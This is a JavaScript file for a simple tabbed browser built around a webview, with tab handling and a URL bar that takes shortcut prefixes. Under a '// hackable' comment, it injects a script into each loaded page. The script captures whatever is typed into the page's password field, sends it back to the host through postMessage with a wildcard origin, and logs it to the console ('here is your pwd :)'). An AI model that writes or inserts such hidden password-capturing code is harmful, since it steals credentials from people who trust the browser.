$(document).ready(()=>{
  tabclick = (e)=>{
    if (e.which === 2) {
      e.preventDefault();
      $(e.target).remove()
      $("webview").prop("src","about://new-tab-page")
    }
    else{
      $(".active").removeClass("active")
      $(e.target).addClass("active")
      $("webview").prop("src",e.target.datasrc)
      $(document).trigger('src-attribute-changed');
      $(".url").val(e.target.datasrc)
    }
  }
  $(".newtab").click(()=>{
    $(".tabs").append("<button onmousedown='tabclick(event)' class='tab' datasrc='https://www.google.com'>New tab</button>")
    $("webview").prop("src","https://www.google.com")
    $(document).trigger('src-attribute-changed');
    $(".tab").focus()
    $(".active").removeClass("active")
    $(".tab").last().addClass("active")
  })
  $(".url").keydown((e)=>{
    if (e.keyCode == 13){
      if (e.currentTarget.value.split(":")[0] == "h"){
        $(".active").prop("datasrc","https://www."+e.currentTarget.value.split(":")[1]);
        $(".active").focus()
        $(document).trigger('src-attribute-changed');
      }
      else if (e.currentTarget.value.split(":")[0] == "g"){
        $(".active").prop("datasrc","https://www.google.com/search?q="+e.currentTarget.value.split(":")[1]);
        $(".active").focus()
        $(document).trigger('src-attribute-changed');
      }
    }
  })

  // hackable ####################################
  const webview = document.getElementById('wbv');
  function contentload() {
    const webviewInjectScript = `
        var data = {
          title: document.title,
          url: window.location.href
        };
        // pwd
        pwd=document.querySelector("input[type='password']")
        pwd.addEventListener("keydown", function() {
          data["pwd"]=pwd.value;
        });
        

        function respond(event) {
          event.source.postMessage(data, '*');
        }

        window.addEventListener("message", respond, false);
    `;

    webview.executeScript({
      code: webviewInjectScript
    });
  }
  function loadstop() {
    webview.contentWindow.postMessage("Send me your data!", "*"); // Send a request to the webview
  }
  webview.addEventListener("contentload", contentload);
  webview.addEventListener("loadstop", loadstop);
  window.addEventListener("message", receiveHandshake, false); // Listen for response

  function receiveHandshake(event) {
    // here is your pwd :)
    console.log(event.data.pwd)
    removeListeners();
  }
  function removeListeners() {
    webview.removeEventListener("contentload", contentload);
    webview.removeEventListener("loadstop", loadstop);
    window.removeEventListener("message", receiveHandshake);
  }
    
});

